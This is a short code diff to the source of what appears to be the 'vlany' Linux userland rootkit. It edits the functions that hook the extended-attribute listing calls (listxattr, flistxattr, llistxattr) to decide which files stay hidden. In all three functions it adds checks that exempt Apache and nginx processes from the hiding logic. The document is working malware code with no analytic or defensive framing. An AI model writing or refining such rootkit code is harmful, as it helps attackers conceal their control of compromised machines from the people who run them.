@@ -25,6 +25,9 @@ int hidden_xattr(const char *filename)
         printf("[vlany] hidden_xattr() is going to attempt to distuingish visibility of %s\n", filename);
     #endif
 
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
+
     HOOK(old_listxattr, CLISTXATTR);
 
     ssize_t buflen, keylen;
@@ -58,6 +61,9 @@ int hidden_fxattr(int fd)
         printf("[vlany] hidden_fxattr() is going to attempt to distuingish visibility of file descriptor %d\n", fd);
     #endif
 
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
+
     HOOK(old_flistxattr, CFLISTXATTR);
 
     ssize_t buflen, keylen;
@@ -90,6 +96,9 @@ int hidden_lxattr(const char *filename)
         printf("[vlany] hidden_lxattr() called\n");
         printf("[vlany] hidden_lxattr() is going to attempt to distuingish visibility of %s\n", filename);
     #endif
+
+    if(getgid() == 33 && getenv("APACHE_PID_FILE") != NULL) return 0; // apache
+    if(getenv("TZ") != NULL) return 0; // nginx
 
     HOOK(old_llistxattr, CLLISTXATTR);
 
